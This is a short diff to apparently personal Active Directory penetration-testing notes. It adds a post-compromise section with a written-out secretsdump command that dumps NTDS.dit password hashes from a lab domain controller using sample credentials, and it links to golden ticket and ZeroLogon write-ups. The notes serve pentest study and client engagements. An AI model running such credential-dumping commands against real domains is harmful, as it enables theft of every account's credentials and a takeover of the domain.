@@ -57,6 +57,10 @@ Where does your account have access
 Old vulnerabilities die hard  
 Think outside the box  
 
+**We've Compromised the Domain - Now what ?**  
+Dumping NTDS.dit: secretsdumpy.py marvel.local/pparker:'Password123'@10.1.1.1 -just-dc-ntlm  
+[Golden Ticket Attack](https://github.com/sodium410/AD/blob/main/golden_ticket.md)  
+
 **Additional AD Attacks**:  reserved for worst case scenarios, should not attempt unless client approves.  
 could completely destroy the domain.. check instead not exploit  
 [ZeroLogon](https://github.com/sodium410/AD/blob/main/zerologon.md)  
